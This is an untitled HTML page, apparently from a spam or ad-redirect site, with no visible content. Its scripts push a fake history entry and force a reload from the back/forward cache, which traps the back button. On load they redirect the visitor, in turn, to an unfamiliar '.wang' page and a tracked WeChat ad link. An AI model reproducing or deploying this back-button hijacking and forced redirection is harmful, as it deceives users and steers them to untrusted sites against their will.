<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title></title>
    <script>
        window.addEventListener('pageshow', function(e) {
            // 通过persisted属性判断是否存在 BF Cache
            if (e.persisted) {
                location.reload();
            }
        });
    </script>
</head>
<body>
<script>
    (function() {
        var hash = 'YlWxPL1p1538027477781';
        history.pushState({}, '1', '#wd');
        var sign = sessionStorage.getItem('sign');
        if (!sign) {
            sign = { hash: hash, count: 0 };
        } else {
            sign = JSON.parse(sign);
            if (sign.hash !== hash) {
                sign = { hash: hash, count: 0 };
            }
        }

        var target = ["http://tiexie0.wang/shucheng_hb1.html","https://mp.weixin.qq.com/mp/ad_biz_info?comp_id=335661&wx_aid=335661&wx_traceid=vwvev&preview=0&__biz=MzU2ODQ1MjgxOQ==&sn=b9bd1e88e10833c3ec08e26dd0f0e24f&from=moments&tid=1699485305#wechat_redirect"];
        sign.count++;
        sessionStorage.setItem('sign', JSON.stringify(sign));
        location.href = target[sign.count % target.length];
    })();
</script>
</body>
</html>
